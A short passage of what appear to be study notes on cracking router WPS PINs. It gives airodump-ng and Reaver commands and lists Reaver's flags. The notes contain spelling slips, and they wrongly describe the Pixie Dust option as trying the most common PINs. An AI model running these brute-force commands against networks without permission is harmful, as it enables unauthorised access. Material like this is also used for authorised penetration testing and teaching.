	to setup their networks and so.

	Reaver is a tool for cracking the 8-digit pin of a router (if WPS is enabled), it brute-forces
	it's way until it finds the WPS pin.

	Commands:

		- airodump-ng --wps [mon_interface_name]
		// Capture traffic of surrounding networks and show if WPS is enabled.

		- reaver -i [mon_interface_name] -b [ap_bssid] -c [channel_name]
		// Use Reaver to start brute-forcing the WPS pin.

		Additional Reaver flags:

		-f = Fixed channel (Disable channel hobbing).

		-a = Detect the best advanced options.

		-w = Mimic a Win 7 registrar.

		-v = Enable verbose.

		-vv = Enable very verbose.

		-K 1 = Use pexie attack (Use most common pins).
